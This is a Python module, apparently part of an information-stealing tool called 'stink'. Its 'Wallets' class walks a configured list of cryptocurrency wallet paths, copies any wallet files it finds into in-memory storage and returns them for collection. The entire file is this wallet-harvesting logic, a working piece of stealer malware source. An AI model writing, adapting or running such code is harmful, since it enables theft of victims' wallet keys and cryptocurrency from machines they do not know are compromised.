from os import path
from typing import List

from stink.helpers import MemoryStorage
from stink.helpers.config import WalletsConfig


class Wallets:
    """
    Collects configs from the crypto wallets.
    """

    def __init__(self, folder: str):
        self.__folder = folder
        self.__config = WalletsConfig()
        self.__storage = MemoryStorage()

    def __get_wallets_files(self) -> None:
        """
        Collects configs from the crypto wallets.

        Parameters:
        - None.

        Returns:
        - None.
        """
        wallets = self.__config.WalletPaths

        for wallet in wallets:
            if not path.exists(wallet["path"]):
                continue

            self.__storage.add_from_disk(
                wallet["path"], path.join(self.__folder, wallet["name"])
            )

    def run(self) -> List:
        """
        Launches the crypto wallets collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:
            self.__get_wallets_files()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Wallets]: {repr(e)}")
